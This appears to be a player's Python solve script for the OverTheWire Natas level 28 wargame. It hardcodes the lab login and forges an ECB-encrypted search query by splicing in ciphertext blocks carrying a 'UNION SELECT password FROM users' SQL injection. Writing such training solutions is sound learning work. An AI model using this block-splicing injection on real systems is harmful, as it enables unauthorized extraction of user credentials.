#! /usr/bin/env python

import requests
import re
import base64
import urllib
import string

usn = 'natas28'
url = 'http://%s.natas.labs.overthewire.org' % usn
passwd = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'
login = (usn, passwd)
request = requests.Session()
block_size = 16

def get_source_code():
  #for i in range(16):
 
   # connection = request.post(url, data = {"query" : "c" * i}, auth = login)
   # print "\n\nquery_length: ", i, ", response length: " , len(base64.b64decode(requests.utils.unquote(connection.url[60:]))) 
   
    #print '*' * 75
    
    #for block in range(80/block_size):
        #print "block", block, "data: ", repr(base64.b64decode(requests.utils.unquote(connection.url[60:]))[block*block_size:(block+1)*block_size])
        # This print will display each block and its associated data from block * the size of the block to(:) the beginning of the next block and then repeat


  target_string = repr('\x80\xe2\xb7\x0cWc\xb5y\xces\x7f\xe8\xda8\x1ev')
  
  # for ch in string.printable:
  #   print "Attempting to append: ", ch
  #   connection = request.post(url, data = {"query" : "c" * 9 + ch}, auth = login)
  #   block = 2 # 0 based 

  #   answer = repr(base64.b64decode(requests.utils.unquote(connection.url[60:]))[block*block_size:(block+1)*block_size])

  #   if answer == target_string:
  #       print "Character found: ", ch


  #SELECT text FROM jokes WHERE LIKE '%input%' - the goal is to have that last single quote be interpreted as the beginning of a SQL injection
  injection = 'a'*9 + "' UNION SELECT password FROM users; #"
  injection_length = ( len(injection) -10 ) / block_size
  if ( len(injection) -10 ) % block_size != 0:
      injection_length += 1
  #print injection_length
  
  connection = request.post(url, auth = login, data = {"query" : injection})
  raw_injection = base64.b64decode(requests.utils.unquote(connection.url[60:]))
  #print repr(raw_injection)

  connection = request.post(url, auth = login, data = {"query" : "a"*10})
  known_base = base64.b64decode(requests.utils.unquote(connection.url[60:]))

  query = known_base[:block_size*3] + raw_injection[block_size*3:block_size*3+(injection_length*block_size)] + known_base[block_size*3:]

  #print requests.utils.quote(base64.b64encode(query)).replace('/','%2F')
  query = requests.utils.quote(base64.b64encode(query)).replace('/','%2F')

  connection = request.get(url + '/search.php/?query='+query, auth = login)

  print connection.text 
#def solve_lab():
  

  ## b64 strings from search
  # G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ0QNoA42sCsWmKTYdRnUF9SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=

  # G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ/ZfLYdG6fmKYaJ6fUlRL/mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=

  # G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKJeKG7v0GPlIq7gpOBr5efmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=


